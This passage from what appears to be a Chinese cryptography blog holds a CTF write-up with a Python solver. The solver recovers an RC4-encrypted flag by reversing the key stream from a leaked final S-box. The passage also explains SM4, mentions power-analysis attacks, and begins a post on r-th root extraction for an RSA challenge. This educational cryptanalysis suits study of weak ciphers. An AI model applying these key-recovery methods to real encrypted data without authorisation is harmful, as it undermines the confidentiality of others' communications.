oO<span class="number">0</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        l = len(oO<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] = oO<span class="number">0</span>[i%l]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[i] + <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[i]</span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0o</span><span class="params">(<span class="keyword">self</span>, length)</span></span><span class="symbol">:</span></span><br><span class="line">        O = []</span><br><span class="line">        <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(length)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo = ( <span class="keyword">self</span>.Ooo + <span class="number">1</span> ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] = <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>], <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo]</span><br><span class="line">            t = ( <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.Ooo] + <span class="keyword">self</span>.O<span class="number">0</span>[<span class="keyword">self</span>.oO<span class="number">0</span>] ) % <span class="number">256</span></span><br><span class="line">            O.append( <span class="keyword">self</span>.O<span class="number">0</span>[t] )</span><br><span class="line">        print(<span class="keyword">self</span>.O<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> O</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(s1, s2)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(map( (lambda <span class="symbol">x:</span> x[<span class="number">0</span>]^x[<span class="number">1</span>]), zip(s1, s2) ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg)</span></span><span class="symbol">:</span></span><br><span class="line">    Oo0oO = Oo<span class="number">0</span>()</span><br><span class="line">    Oo0oO.OO<span class="number">0</span>( md5(msg).digest()[<span class="symbol">:</span><span class="number">8</span>] )</span><br><span class="line">    O0O = Oo0oO.OO0o( len(msg) )</span><br><span class="line">    <span class="keyword">return</span> xor(msg, O0O)</span><br><span class="line"></span><br><span class="line">print( enc(flag) )</span><br><span class="line"></span><br><span class="line"><span class="comment"># [157, 28, 118, 120, 251, 242, 69, 178, 165, 137, 115, 84, 250, 152, 56, 196, 191, 16, 71, 158, 1, 58, 233, 175, 214, 181, 42, 151, 255, 228, 38, 48, 186, 139, 201, 24, 30, 134, 162, 86, 187, 176, 121, 206, 153, 111, 161, 163, 26, 27, 14, 188, 96, 3, 52, 207, 57, 8, 145, 154, 238, 221, 85, 204, 66, 141, 143, 237, 113, 53, 218, 29, 177, 150, 87, 94, 183, 130, 200, 12, 182, 166, 205, 93, 252, 44, 77, 76, 55, 81, 208, 128, 6, 109, 156, 129, 103, 59, 105, 25, 75, 31, 164, 232, 132, 209, 159, 2, 194, 131, 116, 32, 19, 36, 4, 125, 108, 212, 170, 171, 248, 236, 126, 195, 174, 65, 215, 160, 91, 64, 172, 167, 13, 169, 68, 92, 20, 10, 142, 106, 23, 192, 67, 88, 253, 202, 184, 22, 249, 122, 62, 107, 123, 45, 148, 51, 100, 245, 190, 231, 220, 241, 213, 50, 70, 219, 39, 244, 82, 189, 37, 72, 119, 40, 234, 224, 80, 235, 18, 61, 198, 90, 60, 98, 95, 179, 54, 254, 74, 226, 180, 230, 211, 99, 239, 83, 144, 240, 34, 199, 35, 7, 210, 149, 112, 41, 101, 225, 168, 33, 63, 216, 79, 243, 17, 138, 97, 147, 11, 229, 222, 0, 9, 78, 49, 21, 155, 124, 135, 193, 197, 223, 5, 110, 246, 247, 104, 203, 89, 117, 140, 114, 136, 185, 15, 46, 173, 102, 73, 47, 217, 43, 146, 133, 127, 227]</span></span><br><span class="line"><span class="comment"># b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br></pre></td></tr></table></figure><p>程序对函数名做了一些混淆，恢复之后不难看出其实就是RC4的加密流程</p><p>利用前面提到的75小时破解RC4的攻击方法破解明文显然不会是题目的本意，毕竟那方法解密的时间是以小时为单位的。</p><p>可以发现，本题不仅给出了密文，还给出了加密完成之后S盒的内容，突破点无疑是这里了。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>我们看到RC4最后的加密算法部分</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(len(message))</span><br><span class="line">    <span class="built_in">i</span> = (<span class="built_in">i</span> + <span class="number">1</span>)<span class="comment">%256 </span></span><br><span class="line">    <span class="built_in">j</span> = (<span class="built_in">j</span> + s[<span class="built_in">i</span>])<span class="comment">%256</span></span><br><span class="line">    s[<span class="built_in">i</span>],s[<span class="built_in">j</span>] = s[<span class="built_in">j</span>],s[<span class="built_in">i</span>]</span><br><span class="line">    t = (s[<span class="built_in">i</span>] + s[<span class="built_in">j</span>])<span class="comment">%256</span></span><br><span class="line">    cipher += message[<span class="built_in">i</span>]^s[t]</span><br></pre></td></tr></table></figure><p>首先我们可以确定的是，RC4既然是按字节加密。那么明文和密文的长度便是一致的，所以我们便可以确定加密部分经过了几次循环。</p><p>其次，与常规解密不同的是，我们显然知道flag的最后一位字符是’}’,由于异或运算的对合性，我们异或密文和明文的最后一位，便可以得到密钥的最后一位，（其实就算最后一位字符不确定，也是可以暴力遍历一百多种可能，找到其中有意义的即可）</p><p>知道密钥的最后一位，即s[t]，我们再根据最后给出的S盒就能确定t的值，</p><p>我们还知道i的值就代表着循环的次数，所以i的值也是确定的。</p><p> <strong>t = (s[i] + s[j])%256</strong>：S盒确定，i确定，t确定，因此j也是可以推出来。</p><p>推出j后，我们就可以进行swap(s[i],[j])，将S盒变回去。</p><p><strong>j = (j + s[i])%256</strong>：j推出来后，s[i]是确定的，我们就能确定上一轮的j的值</p><p>确定了上一轮的j的值，i的值也是确定的，<strong>t = (s[i] + s[j])%256</strong>，这样就能确定t的值，从而确定s[t]，即密钥的值，有了密钥就能解密密文，推出明文了。</p><p>然后再利用s[i]，不断的推出前面的j，就能不断的倒推出明文了。最后将明文逆序一下，就是flag了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">b'\x14\xe3s,\xcbq\xa8\xd1\x86\x12\xba\x9f\x88\xa9J&#125;\xf5\xd8BF\x93x\x94\x8a\xdc\xdb\xa0\xb9O0SeJ^\xc7\xce\xcf\xe3\x1c\x10s\xe2\xb6\xceA\xfd\xd6\x87\x95W'</span></span><br><span class="line">s= [<span class="number">157</span>, <span class="number">28</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">251</span>, <span class="number">242</span>, <span class="number">69</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">250</span>, <span class="number">152</span>, <span class="number">56</span>, <span class="number">196</span>, <span class="number">191</span>, <span class="number">16</span>, <span class="number">71</span>, <span class="number">158</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">233</span>, <span class="number">175</span>, <span class="number">214</span>, <span class="number">181</span>, <span class="number">42</span>, <span class="number">151</span>, <span class="number">255</span>, <span class="number">228</span>, <span class="number">38</span>, <span class="number">48</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">86</span>, <span class="number">187</span>, <span class="number">176</span>, <span class="number">121</span>, <span class="number">206</span>, <span class="number">153</span>, <span class="number">111</span>, <span class="number">161</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">188</span>, <span class="number">96</span>, <span class="number">3</span>, <span class="number">52</span>, <span class="number">207</span>, <span class="number">57</span>, <span class="number">8</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">238</span>, <span class="number">221</span>, <span class="number">85</span>, <span class="number">204</span>, <span class="number">66</span>, <span class="number">141</span>, <span class="number">143</span>, <span class="number">237</span>, <span class="number">113</span>, <span class="number">53</span>, <span class="number">218</span>, <span class="number">29</span>, <span class="number">177</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">94</span>, <span class="number">183</span>, <span class="number">130</span>, <span class="number">200</span>, <span class="number">12</span>, <span class="number">182</span>, <span class="number">166</span>, <span class="number">205</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">81</span>, <span class="number">208</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">156</span>, <span class="number">129</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">25</span>, <span class="number">75</span>, <span class="number">31</span>, <span class="number">164</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">209</span>, <span class="number">159</span>, <span class="number">2</span>, <span class="number">194</span>, <span class="number">131</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">125</span>, <span class="number">108</span>, <span class="number">212</span>, <span class="number">170</span>, <span class="number">171</span>, <span class="number">248</span>, <span class="number">236</span>, <span class="number">126</span>, <span class="number">195</span>, <span class="number">174</span>, <span class="number">65</span>, <span class="number">215</span>, <span class="number">160</span>, <span class="number">91</span>, <span class="number">64</span>, <span class="number">172</span>, <span class="number">167</span>, <span class="number">13</span>, <span class="number">169</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">142</span>, <span class="number">106</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">67</span>, <span class="number">88</span>, <span class="number">253</span>, <span class="number">202</span>, <span class="number">184</span>, <span class="number">22</span>, <span class="number">249</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">107</span>, <span class="number">123</span>, <span class="number">45</span>, <span class="number">148</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">245</span>, <span class="number">190</span>, <span class="number">231</span>, <span class="number">220</span>, <span class="number">241</span>, <span class="number">213</span>, <span class="number">50</span>, <span class="number">70</span>, <span class="number">219</span>, <span class="number">39</span>, <span class="number">244</span>, <span class="number">82</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">119</span>, <span class="number">40</span>, <span class="number">234</span>, <span class="number">224</span>, <span class="number">80</span>, <span class="number">235</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">198</span>, <span class="number">90</span>, <span class="number">60</span>, <span class="number">98</span>, <span class="number">95</span>, <span class="number">179</span>, <span class="number">54</span>, <span class="number">254</span>, <span class="number">74</span>, <span class="number">226</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">240</span>, <span class="number">34</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">210</span>, <span class="number">149</span>, <span class="number">112</span>, <span class="number">41</span>, <span class="number">101</span>, <span class="number">225</span>, <span class="number">168</span>, <span class="number">33</span>, <span class="number">63</span>, <span class="number">216</span>, <span class="number">79</span>, <span class="number">243</span>, <span class="number">17</span>, <span class="number">138</span>, <span class="number">97</span>, <span class="number">147</span>, <span class="number">11</span>, <span class="number">229</span>, <span class="number">222</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">155</span>, <span class="number">124</span>, <span class="number">135</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">223</span>, <span class="number">5</span>, <span class="number">110</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">203</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">140</span>, <span class="number">114</span>, <span class="number">136</span>, <span class="number">185</span>, <span class="number">15</span>, <span class="number">46</span>, <span class="number">173</span>, <span class="number">102</span>, <span class="number">73</span>, <span class="number">47</span>, <span class="number">217</span>, <span class="number">43</span>, <span class="number">146</span>, <span class="number">133</span>, <span class="number">127</span>, <span class="number">227</span>]</span><br><span class="line">t=s.index(ord(<span class="string">'&#125;'</span>)^ord(<span class="string">'W'</span>))  <span class="comment">#根据最后一位密钥，确定t</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">50</span><span class="comment">#密文长度，也就是加密经过的循环的趟数</span></span><br><span class="line">sj=(t-s[i])%<span class="number">256</span></span><br><span class="line">j=s.index(sj)   <span class="comment">#根据t和s[i]的值，确定j的值</span></span><br><span class="line">s[i],s[j]=s[j],s[i]<span class="comment">#获取上一轮s盒</span></span><br><span class="line">j=(j-s[i])%<span class="number">256</span><span class="comment">#恢复前一个j的值</span></span><br><span class="line">i=i<span class="number">-1</span><span class="comment">#i也随着倒推而减少</span></span><br><span class="line">t=(s[i]+s[j])%<span class="number">256</span><span class="comment">#倒数第二轮的i值，j值，S盒都确定了，就可以推出t的值，从而获得密钥到数第二位</span></span><br><span class="line">flag=<span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    flag+=(chr((enc[i<span class="number">-1</span>])^s[t]))<span class="comment">#解密密文</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]<span class="comment">#获取上一轮S盒.....如此循环</span></span><br><span class="line">    j=(j-s[i])%<span class="number">256</span></span><br><span class="line">    i=i<span class="number">-1</span></span><br><span class="line">    t=(s[i]+s[j])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">flag=flag[::<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>前面按位加密的RC4由于算法弱点已经被停用了，而作为我国的分组密码标准 SM4在算法上目前还没有被破解。（但仍旧面临差分功耗攻击的威胁）</p><h2 id="SM4简介"><a href="#SM4简介" class="headerlink" title="SM4简介"></a>SM4简介</h2><p>SM4是一种分组密码算法，分组长度为128bit，密钥长度也为128bit。加解密算法结构相同，轮密钥的使用次序则相反。加密算法和解密算法以及密钥拓展算法均采用了32轮的非线性迭代结构 </p><h2 id="SM4加密流程"><a href="#SM4加密流程" class="headerlink" title="SM4加密流程"></a>SM4加密流程</h2><p><img src="https://i.loli.net/2020/04/30/T9Nm8teudHM3cKG.png" alt="SM4加密流程"></p><p>其中明文被分成四组，每一组32bit即4字节。然后加上轮密钥进行一次轮函数F运算，</p><p>$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rK_i)=X_i ⊕ T( X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$</p><h3 id="轮函数F："><a href="#轮函数F：" class="headerlink" title="轮函数F："></a>轮函数F：</h3><h4 id="其中T函数："><a href="#其中T函数：" class="headerlink" title="其中T函数："></a>其中T函数：</h4><p>T(x)=L(τ(x))</p><h4 id="其中τ是非线性变换："><a href="#其中τ是非线性变换：" class="headerlink" title="其中τ是非线性变换："></a>其中τ是非线性变换：</h4><p>​        τ由四个并行的S盒构成。</p><p>​        设输入为A，输出为 B(4字节)</p><p>​        $B =（b_0,b_1,b_2,b_3）= τ(A)=(Sbox(a_0),Sbox(a_0),Sbox(a_0),Sbox(a_0))$</p><p><img src="https://i.loli.net/2020/04/30/MbhwxpYAZfjrVWu.png" alt="Sbox"></p><h4 id="其中L函数："><a href="#其中L函数：" class="headerlink" title="其中L函数："></a>其中L函数：</h4><p>​        输入为非线性变换的输出，设输出为C</p><p>​        $C = L(B) = B ⊕（B&lt;&lt;&lt;2） ⊕(B&lt;&lt;&lt;10) ⊕(B&lt;&lt;&lt;18) ⊕(B&lt;&lt;&lt;24)        $（需要说明的是这里进行的是循环位移操作）</p><h3 id="密钥拓展："><a href="#密钥拓展：" class="headerlink" title="密钥拓展："></a>密钥拓展：</h3><h4 id="系统参数FK"><a href="#系统参数FK" class="headerlink" title="系统参数FK"></a>系统参数FK</h4><p>设系统参数$FK  =  （FK_0,FK_1,FK_2,FK_3）$</p><p><img src="https://i.loli.net/2020/04/30/21TFBa8mN4XfSwJ.png" alt="FK"></p><h4 id="固定参数CK"><a href="#固定参数CK" class="headerlink" title="固定参数CK"></a>固定参数CK</h4><p>设固定参数$CK = （CK_0,CK_1,CK_2,CK_3）$</p><p><img src="https://i.loli.net/2020/04/30/Ws5IuCyFMrifEjx.png" alt="CK"></p><h4 id="加密密钥MK"><a href="#加密密钥MK" class="headerlink" title="加密密钥MK"></a>加密密钥MK</h4><p>设加密密钥$MK=（MK_0,MK_1,MK_2,MK_3）$（内容随便定义）（$MK_i$为四字节，所以密钥为128bit）</p><h4 id="轮密钥rKi"><a href="#轮密钥rKi" class="headerlink" title="轮密钥rKi"></a>轮密钥rK<del>i</del></h4><p>首先$（K_0,K_1,K_2,K_3）= （MK_0⊕FK_0, MK_1⊕, FK_1, MK_2⊕FK_2, MK_3⊕FK_3）$</p><p>然后生成轮密钥$rK_i=K_{i+4}=K_i⊕T’(K_{i+1}⊕K_{i+2}⊕K_{i+3}⊕CK_i)    (i=0,1,2,,,31)$</p><p>其中T’与上文提到的T函数几乎一致，只是将其中的L函数改为：</p><p>$L`(B) = B ⊕(B&lt;&lt;&lt;13)⊕(B&lt;&lt;&lt;23) $</p><p>可以看出加密是一组128bit，16字节，但一轮只加密4字节，一共进行32轮加密，最后将结果逆序得到密文。</p><h2 id="SM4解密流程"><a href="#SM4解密流程" class="headerlink" title="SM4解密流程"></a>SM4解密流程</h2><p>由于异或运算的对合性：</p><p>因为$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3~}rK_i)=X_i ⊕ T( X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$</p><p>所以$X_i=F(X_{i+4},X_{i+1},X_{i+2},X_{i+3},rK_i)=X_{i+4} ⊕ T(X_{i+1}⊕X_{i+2}⊕X_{i+3}⊕rK_i)$</p><p>所以解密流程仅是是加密流程的逆序：</p><p>先将密文逆序，然后轮密钥也要倒着用$rK_31,rK_30,,,,rK_0$</p><p>只不过加密时，轮密钥的生成和密文的加密可以同步进行，而解密时就要一次性先生成好所有的轮密钥，然后倒着用。</p><h1 id="差分功耗分析攻击（DPA）"><a href="#差分功耗分析攻击（DPA）" class="headerlink" title="差分功耗分析攻击（DPA）"></a>差分功耗分析攻击（DPA）</h1><p>​        现在的分组密码，包括SM4，AES等算法，都面临着差分功耗攻击的威胁。 通过利用自主设计的功耗攻击平台采集SM4算法加密过程中的功耗曲线，并对采集好的曲线进行差分处理，从而获得了SM4算法的密钥。实验结果表明，当采集400条以上功耗曲线时，即有90%以上的概率破解密钥。 </p><p>​        尽管算法本身没有弱点，但是包括差分功耗攻击在内的侧信道攻击却是个巨大威胁</p><p><a href="http://www.fx361.com/page/2018/0506/3480892.shtml" target="_blank" rel="noopener">文章</a>提到的对SM4的差分功耗攻击可以分别猜测轮密钥，进而恢复密钥， 验证了SM4算法在面临差分功耗攻击时的脆弱性。也为SM算法的进一步改善和完善提供了依据。能够有效抵御差分功耗攻击应该未来安全加密算法需要考虑的一个重要因素。</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p> <a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a> </p><p> <a href="https://zh.wikipedia.org/wiki/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/RC4</a> </p><p> <a href="https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin</a> </p><p> <a href="https://blog.csdn.net/weixin_37569048/article/details/94983841" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37569048/article/details/94983841</a> </p><p> <a href="https://blog.csdn.net/cg129054036/article/details/83016958" target="_blank" rel="noopener">https://blog.csdn.net/cg129054036/article/details/83016958</a> </p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Stream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rc4 </tag>
            
            <tag> SM4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</title>
      <link href="/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/"/>
      <url>/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/194232" target="_blank" rel="noopener">安全客</a></p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>在NCTF上遇到了一道出题人用来压轴的RSA，与正常RSA加密不同的是，本题的$e$是$φ(p)$和$φ(q)$的一个因子。在出题人给出hint后，我找到了一篇paper，侥幸用paper中提到的算法拿到了一血~</p><p>该算法可以在有限域$F_q$中开$r$次根，但需要s，满足$r^s$整除$q-1$，即$r^s$ | $q-1$，并且$s$要小。</p><h2 id="On-r-th-Root-Extraction-Algorithm-in-Fq"><a href="#On-r-th-Root-Extraction-Algorithm-in-Fq" class="headerlink" title="On r-th Root Extraction Algorithm in Fq"></a>On r-th Root Extraction Algorithm in Fq</h2><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">On r-th Root Extraction Algorithm </a></p><h3 id="引言："><a href="#引言：" class="headerlink" title="引言："></a>引言：</h3><p>我们让r为一个大于1的整数，那么有现存的两种算法用来在有限域Fq中开r^s次根， the Adleman-Manders-Miller algorithm 和 the Cipolla-Lehmer algorithms</p><p>假设$r&lt;&lt;log q$ ，由于 the Adleman-Manders-Miller algorithm 要求s满足$ r^s | q-1 $并且 $r^{s+1}$ 不能整除 $q-1$，所以它的时间复杂度O(logrlog4 q) 比 the Cipolla-Lehmer algorithms 的时间复杂度$O(rlog_3q)$ 要高。但是，由于Cipolla Lehmer需要繁琐的扩展字段算法，当s比较小时，the Adleman-Manders-Miller algorithm 要比之更为有效。</p><p>另一方面，在某些情况下还存在比 Tonelli-Shanks 计算更快的其他方法来做开方运算。例子就是当 $q\equiv  3 \pmod {4}$.</p><p>$c$时$F_q$中的二次剩余时，$c$的其中一个根就是$c^\frac{q+1}{4}$，利用欧拓很容易证明$(c^\frac{q+1}{4})^2 = c$</p><p>当$s=2，3$时，也有类似的方法， Atkin , Mu¨ller and Kong et al ，他们的方法在这种情况下， 要比Tonelli-Shanks and the Cipolla-Lehmer 表现得更为出色。</p><p><img src="https://i.loli.net/2020/04/30/AerdW8NUFjV4iao.png" alt="Tonelli-Shanks and the Cipolla-Lehmer "></p><p>但是作者认为这些方法不能很好的解决普遍的情况，所以作者展示了一种，新的开根的方法，只用一个预计算好的基元，一次指数运算，并且在s很小的时候十分高效。</p><h3 id="开二次根算法："><a href="#开二次根算法：" class="headerlink" title="开二次根算法："></a>开二次根算法：</h3><p>有一些高效的公式，分别当$ q \equiv  5 \pmod{ 8}$ ，或者 $q \equiv  9 \pmod{ 16}$ 。如果$q \equiv  5 \pmod{ 8}$，属于 $q \equiv  1 \pmod{ 4}$, 的一种特殊情况， Atkin 有一种只进行一次指数运算的高效的公式。</p><h5 id="Algorithm-1-Atkin’s-algorithm-when-q-equiv-5-pmod-8"><a href="#Algorithm-1-Atkin’s-algorithm-when-q-equiv-5-pmod-8" class="headerlink" title="Algorithm 1 Atkin’s algorithm when $q \equiv  5 \pmod{ 8}$"></a>Algorithm 1 Atkin’s algorithm when $q \equiv  5 \pmod{ 8}$</h5><p>方程，$x^2 = a \pmod{q}$，已知a，求x</p><ol><li>$b &lt;== (2a)^\frac{q-5}{8}$</li><li>$i &lt;== 2ab^2$</li><li>$x &lt;==ab(i-1)$</li><li>$return x$</li></ol><h5 id="Algorithm-2-Mu¨ller’s-algorithm-when-q-equiv-9-pmod-16"><a href="#Algorithm-2-Mu¨ller’s-algorithm-when-q-equiv-9-pmod-16" class="headerlink" title="Algorithm 2 Mu¨ller’s algorithm when $q \equiv  9 \pmod{ 16}$"></a>Algorithm 2 Mu¨ller’s algorithm when $q \equiv  9 \pmod{ 16}$</h5><p>方程，$x^2 = a \pmod{q}$，已知$a$，求$x$</p><ol><li>$b &lt;== (2a)^\frac{q-1}{4}$</li><li>$Find randomly d satisfying -b = η(d)$</li><li>$u &lt;== (2ad^2)^\frac{q-9}{16}$</li><li>$i &lt;== 2u^2d^2a$</li><li>$x &lt;== uda(i-1)$</li><li>$retrun x$</li></ol><p>其中第二步有个神奇的东西 $η(d)$ ，paper中给的定义是</p><p><img src="https://i.loli.net/2020/04/30/YuCydhUnjMKci4t.png" alt="problem"></p><p>，然鹅想不出怎么让它等于$-b$，（还求大师傅们指点~）</p><h3 id="在有限域中-Fq-开-r-s-根-q-equiv-lr-s-1-pmod-r-s-1"><a href="#在有限域中-Fq-开-r-s-根-q-equiv-lr-s-1-pmod-r-s-1" class="headerlink" title="在有限域中 Fq 开 $r^s$ 根 [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]"></a>在有限域中 Fq 开 $r^s$ 根 [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]</h3><p>首先我们需要一个质数$q$，并且有一个$r$，满足$ r | (q-1)$，（如果$r$与$q-1$互质，那问题就很简单了，$r$的逆用欧拓很快就能找到）然后会存在一个s，s是满足$\frac{q-1}{r^s} \equiv l \pmod{r}$的最大的正整数</p><p>即会满足$q \equiv lr^s + 1 \pmod{r^{s+1}}$</p><h4 id="定理1：在域Fq中，给定一个r次幂c，存在一个b，使得-c-r-1-cdot-b-cdot-r-具有-r-t-阶，（-t-lt-s-）"><a href="#定理1：在域Fq中，给定一个r次幂c，存在一个b，使得-c-r-1-cdot-b-cdot-r-具有-r-t-阶，（-t-lt-s-）" class="headerlink" title="定理1：在域Fq中，给定一个r次幂c，存在一个b，使得$c^{(r-1)\cdot b}\cdot r$ 具有$r^t$阶，（$t&lt;s$）"></a>定理1：在域Fq中，给定一个r次幂c，存在一个b，使得$c^{(r-1)\cdot b}\cdot r$ 具有$r^t$阶，（$t&lt;s$）</h4><h5 id="证明："><a href="#证明：" class="headerlink" title="证明："></a>证明：</h5><p>我们设一个$l$，满足$gcd(l,r)=1$,那么存在$β (0≤β&lt;l)$，满足 $rβ+r−1 \equiv  0 \pmod{ l}$即存在$α$，满足 $rβ + r−1 = lα.$</p><p>然后，我们设一个 $ζ$ 为，</p><p>$ζ = (c^a)^\frac{q-1}{r^2}$</p><p>则有</p><p>$ζ = (c^a)^\frac{q-1}{r^2}$</p><p> = $(c^a)^\frac{q-1}{r^2}c^{rβ+r-1-lα} = c^{r-1}c^{rβ}(c^α)^\frac{q-1}{r^s}c^{-lα}$</p><p> = $c^{r-1}{c^β(c^α)^\frac{q-1-lr^s}{r^{s+1}}}^r = c^{r-1}b^r$</p><p>其中，$b = 